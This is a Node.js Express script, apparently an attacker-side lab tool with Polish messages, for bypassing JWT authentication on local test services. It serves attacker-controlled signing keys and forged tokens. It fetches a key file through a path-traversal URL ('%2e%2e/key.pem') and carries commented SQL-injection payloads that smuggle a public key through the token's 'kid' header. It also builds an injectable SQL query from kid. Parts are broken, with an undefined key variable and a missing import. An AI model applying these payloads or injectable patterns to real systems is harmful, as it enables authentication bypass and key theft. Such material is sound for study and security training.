const Express = require('express');
const jwt = require('jsonwebtoken');
const st = require('st');
const jose = require('node-jose');
const jwktopem = require('jwk-to-pem')
const axios = require('axios')
const app = new Express();
const request = require('request')
var sqlite3 = require('sqlite3').verbose();
app.use(Express.json())

// define the payload
const http = require('http')

const path = require('path')
const mount = st({ path: path.join(__dirname, '/static'), url: '/static'})

http.createServer((req, res) => {
  const stHandled = mount(req, res)
  if (stHandled)
    return
  else
    res.end('this is not a static file')
}).listen(1338)
//app.use(mount)
app.get('/jwks', async (req, res) => {
    const ks = fs.readFileSync('attacker_keys.json')
    const keyStore = await jose.JWK.asKeyStore(ks.toString())
    
    res.send(keyStore.toJSON())
  })
  app.get('/tokens', async (req, res) => {
    const ks = fs.readFileSync('attacker_keys.json')
    const keyStore = await jose.JWK.asKeyStore(ks.toString())
    const [key] = keyStore.all({ use: 'sig' })
    
    const opt = { compact: true, jwk: key, fields: { typ: 'jwt', kid: "3" } }
    const payload = JSON.stringify({
      exp: Math.floor((Date.now() + 24*60*60*1000) / 1000),
      iat: Math.floor(Date.now() / 1000),
      sub: 'test',

    })
    let token = await jose.JWS.createSign(opt, key)
      .update(payload)
      .final()
    token = token.toString('base64')
    res.send({ token})
  })
  app.get('/verify', validateToken, async (req, res) => {
    res.send("atak jako localhost:5002 / admin udany")
  })
  app.get('/admin', validateToken, async (req, res) => {
    const token = req.body.token
    var decoded = JSON.parse(jwt.decode(token));
    if(decoded.user== 'admin'){
      res.send("atak jako localhost:5002 / admin udany")
    }
    else{
      res.status(403).send("not admin gtfo")
    }

    console.log(decoded)
  })
  app.get('/data', (req, res)=>{
    http.get('http://localhost:1338/static/%2e%2e/key.pem', response => {
      console.log('Status Code:', response.statusCode);
      console.log(response.payload)
      res.send(response)
      });
      })
    app.get('/data1', (req, res)=>{
    request.get('http://localhost:1338/static/%2e%2e/key.pem', function (error, response, body) {
      var data = body
      res.send(data)
      });
      })

//`0 UNION SELECT \'-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDOZ2ZxoEmy0oSkE+XF1Nau+7OM\nw1uHQiasyx6Tvp+SEVjRf+gcIuUdfbVIni1QcrM6jnqBM/HokCH+3/prTc1yKi31\nU41a7bRreb20qYDN7cvGf4UdQsoNbIgfC65OcTPAxHMdGcOTiLRqi4HjpyEPfbv7\nJ0j2DeRQPMOUk6xLDwIDAQAB\n-----END PUBLIC KEY-----\'`
  
  async function validateToken(req, res, next) {
    const token = req.body.token
    var decoded = jwt.decode(token);
    const header = JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString())
    console.log(header)
    //header.kid = `0 UNION SELECT \'-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\n-----END RSA PUBLIC KEY-----\'`
    let kid = header.kid
    const data = await getKey()
    console.log(data)
    //publicKey  = db.get("SELECT pem FROM keys where id= "+header.kid)
    //let publicKeys = []
    //const result = db1.get("SELECT pem FROM keys where id = 3");
    //let results12 = await getData()
    //console.log("hereere"+results12)
    //console.log(results1);
     jwt.verify(token, publicKey, (err, user) => {
      if (err) {
        console.log(err)
          res.status(403).send("Token invalid")
      }
      else {
          req.user = user
          next() //proceed to the next action in the calling function
      }
  })
}
     //const key = await jose.JWK.asKey(publicKey);
     //const key = await jose.JWK.asKey(publicKey, 'pem');
     //const verifier = jose.JWS.createVerify(key);
     //const v = await verifier.verify(token);
     //console.log(v.header)
    // console.log(v.payload.toString())
      //console.log("SELECT id, pem FROM keys where id= "+header.kid)
      //db.each("SELECT pem FROM keys where id= "+header.kid, function(err, row) {
       // console.log(row);
      //});

      //const{ data} = await axios.get("http://localhost:5001/jwks")
    
    //next() 
    

async function getKey(){
  return new Promise((resolve, reject) => {
    request.get('http://localhost:1338/static/%2e%2e/key.pem', function (error, response, body) {
      var data = body;
      console.log('xd');
      resolve(data);
      });
  })
}   

async function getPemById(db, kid) {
  return new Promise((resolve, reject) => {
      db.get(`SELECT pem FROM keys where id = ${kid}`,(err, row) => {
          if (err) reject(err); // I assume this is how an error is thrown with your db callback
          resolve(row.pem);
      });
  });
}

  app.listen(5001, () => console.log('server started :5001'))